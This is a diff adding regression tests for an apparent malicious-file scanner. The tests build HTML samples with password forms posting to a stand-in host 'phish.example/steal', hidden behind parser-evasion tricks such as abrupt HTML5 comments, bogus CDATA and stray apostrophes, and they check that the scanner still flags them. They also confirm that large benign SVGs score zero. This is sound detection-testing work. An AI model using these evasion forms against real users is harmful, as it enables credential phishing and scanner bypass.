@@ -421,3 +421,54 @@ def test_review_regressions_cdata_arrow_oversize_rfc2397_smil_and_linear_trailin
     )
     res_ms = _scan(tmp_path, "mssave.html", ms_save)
     assert "HTML_SMUGGLING" in _rule_ids(res_ms)
+
+
+def test_review_r2_regressions_html5_comments_rawtext_unquoted_and_polygon_path(
+    tmp_path: Path,
+) -> None:
+    # Blocker 1a: literal '<' in prose + apostrophe before phishing form
+    prose_lt = (
+        b"<!DOCTYPE html><html><body><p>If x < 5 and it's fine</p>"
+        b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "prose_lt.html", prose_lt))
+
+    # Blocker 1b: HTML5 unquoted attribute containing apostrophe
+    unq_attr = (
+        b"<!DOCTYPE html><html><body><meta name=author content=O'Brien>"
+        b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "unq_attr.html", unq_attr))
+
+    # Blocker 1c: <style> RAWTEXT with "< '" before phishing form
+    style_raw = (
+        b"<!DOCTYPE html><html><head><style>/* < ' */</style></head>"
+        b'<body><form action="https://phish.example/steal"><input type="password"></form></body></html>'
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "style_raw.html", style_raw))
+
+    # Blocker 2: HTML5 abrupt comments <!-->, <!--->, --!> and bogus <![CDATA[>
+    for idx, prefix in enumerate((b"<!-->", b"<!--->", b"<!-- x --!>", b"<![CDATA[>")):
+        doc = (
+            b"<!DOCTYPE html><html><body>"
+            + prefix
+            + b'<form action="https://phish.example/steal"><input type="password"></form></body></html>'
+        )
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"comment_{idx}.html", doc))
+
+    # Major 1: benign oversized <polygon> and <path fill="none"> (> 64 KiB) stay GREEN 0
+    huge_poly = (
+        b'<svg xmlns="http://www.w3.org/2000/svg"><polygon points="'
+        + b"10,20 " * 12_000
+        + b'"/></svg>'
+    )
+    res_poly = _scan(tmp_path, "huge_poly.svg", huge_poly)
+    assert res_poly.risk_level == RiskLevel.GREEN and res_poly.score == 0
+
+    huge_path_none = (
+        b'<svg xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="none" d="M0 0'
+        + b" L1 1" * 15_000
+        + b'"/></svg>'
+    )
+    res_pn = _scan(tmp_path, "huge_path_none.svg", huge_path_none)
+    assert res_pn.risk_level == RiskLevel.GREEN and res_pn.score == 0
